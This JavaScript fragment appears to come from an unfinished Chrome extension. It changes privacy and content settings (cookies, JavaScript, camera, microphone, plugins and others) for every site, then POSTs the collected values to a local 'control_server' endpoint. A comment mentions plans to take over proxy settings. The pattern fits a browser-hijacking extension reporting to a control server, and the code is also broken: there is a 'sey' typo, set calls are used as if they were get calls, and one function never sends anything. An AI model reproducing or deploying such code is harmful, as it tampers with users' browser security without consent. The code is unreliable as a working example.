
//Modify proxy settings

//For this I have yet to fully explore proxy capabilities and structure https://3-72-0-dot-chrome-apps-doc.appspot.com/extensions/proxy#overview-examples


//Modify privacy settings

function loggingprivacySettings(){

    var S='';

    chrome.privacy.network.set({primaryUrl:'http://*'},function(details){S+='Cookies : '+details.setting+' ';});
    chrome.privacy.services.sey({primaryUrl:'http://*'},function(details){S+='Images : '+details.setting+' ';});
    chrome.privacy.websites.set({primaryUrl:'http://*'},function(details){S+='JavaScript : '+details.setting+' ';});

}


//Modify content Settings

function loggingcontentSettings(){

    var S='';

    chrome.contentSettings.cookies.set({primaryUrl:'http://*'},function(details){S+='Cookies : '+details.setting+'<br>';});
    chrome.contentSettings.images.set({primaryUrl:'http://*'},function(details){S+='Images : '+details.setting+'<br>';});
    chrome.contentSettings.javascript.set({primaryUrl:'http://*'},function(details){S+='JavaScript : '+details.setting+'<br>';});
    chrome.contentSettings.location.set({primaryUrl:'http://*'},function(details){S+='Location : '+details.setting+'<br>';});
    chrome.contentSettings.plugins.set({primaryUrl:'http://*'},function(details){S+='Plugins : '+details.setting+'<br>';});
    chrome.contentSettings.popups.set({primaryUrl:'http://*'},function(details){S+='Popups : '+details.setting+'<br>';});
    chrome.contentSettings.notifications.set({primaryUrl:'http://*'},function(details){S+='Notifications : '+details.setting+'<br>';});
    chrome.contentSettings.fullscreen.set({primaryUrl:'http://*'},function(details){S+='Full Screen : '+details.setting+'<br>';});
    chrome.contentSettings.mouselock.set({primaryUrl:'http://*'},function(details){S+='Mouse Lock : '+details.setting+'<br>';});
    chrome.contentSettings.microphone.set({primaryUrl:'http://*'},function(details){S+='Microphone : '+details.setting+'<br>';});
    chrome.contentSettings.camera.set({primaryUrl:'http://*'},function(details){S+='Camera : '+details.setting+'<br>';});
    chrome.contentSettings.unsandboxedPlugins.set({primaryUrl:'http://*'},function(details){S+='Unsandboxed Plugins : '+details.setting+'<br>';});
    chrome.contentSettings.automaticDownloads.set({primaryUrl:'http://*'},function(details){S+='Automatic Downloads : '+details.setting+'<br>';});
   
    setTimeout(function(){   fetch('http://127.0.0.1:5000/control_server',
    {
    method: "POST",
    mode: 'no-cors', 
    body: JSON.stringify(S),
    headers:{"Content-Type": "application/json"}
    });},1500);    


}


